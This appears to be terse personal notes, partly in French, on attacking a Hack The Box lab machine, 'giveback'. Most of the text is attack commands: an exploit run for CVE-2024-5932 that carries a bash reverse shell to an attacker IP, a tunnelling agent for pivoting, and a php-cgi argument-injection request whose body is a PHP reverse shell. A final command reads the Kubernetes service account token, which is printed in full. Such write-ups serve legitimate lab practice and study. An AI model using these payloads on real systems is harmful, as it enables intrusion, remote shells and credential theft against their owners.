


![[IMG-20260115182823570.png]]

```
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.134/4444 0>&1'"
```


![[IMG-20260115190938163.png]]


![[IMG-20260115190900250.png]]

![[IMG-20260115194320820.png]]

Machine Cible:
```
./agent -connect 10.10.16.33:11601 -accept-fingerprint 64E58D21BCF29BC9CCDDF20562AEE96877EFF5D6A87AD37B75A03B118CBF0175
```

![[IMG-20260115194345293.png]]

Machine atttaquante:
![[IMG-20260115194433931.png]]
![[IMG-20260116030630630.png]]
![[IMG-20260116030316748.png]]

Variable environnement:
![[IMG-20260116030342781.png]]

```
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
```

![[IMG-20260116030420077.png]]

On utilise nikto pour footprinter les siteweb:
![[IMG-20260118160714840.png]]

/cgi-bin/php-cgi
[HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html#old-php--cgi--rce-cve-2012-1823-cve-2012-2311)


![[IMG-20260119004545787.png]]


```
POST /cgi-bin/php-cgi?-d+disable_functions=+-d+auto_prepend_file=php://input HTTP/1.1
Host: 10.43.2.241:5000
Content-Type: text/plain
Content-Length: 77


php -r '$sock=fsockopen("10.10.16.33",5555);shell_exec("sh <&3 >&3 2>&3");'
```


![[IMG-20260119004711181.png]]

```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODAwMzE1MzcyLCJpYXQiOjE3Njg3NzkzNzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiOWM5NTc0YTctOGJkYS00ZjlmLWJkNDQtZWJkMzYyOTA0MGFhIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LXpjeDg4IiwidWlkIjoiNjEyYmJmZjMtOTQ3NS00ZGVmLTg2MjQtNTI1ODI4MzAwNDAzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2ODc4Mjk3OX0sIm5iZiI6MTc2ODc3OTM3Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.Nmw2ZkkE1MxdQTtK0eNd57mdElmVnNTTG8A8J5LVPqGtVvcP75Fbsna4oNFofhrIN3ljOKLBVYClQ4yImQuPUZswAXMcQKJtgHvHoZswv0LJLMs9ST8Pp2-lMRjR0uFO0WWpLMNELIWxHXnAEbXMPFq-nc0TQcB9L0Tz-E8sWvKlCyuY2D4CIZx2HDEBkUs6Am5xMvmJKCoQn7nc5C-M5lJGpQhBtlA7eD1BhDBLM7OIXT2lMs1RuhOldTHpr0QPTH6ttIO01oRypajdSh9zUHGtiWOQBP2V4MVIL-M7nSqfS4wnCJVPFEypaegBlQ-HMcjISduo6E6X6bYGev_RNg
```
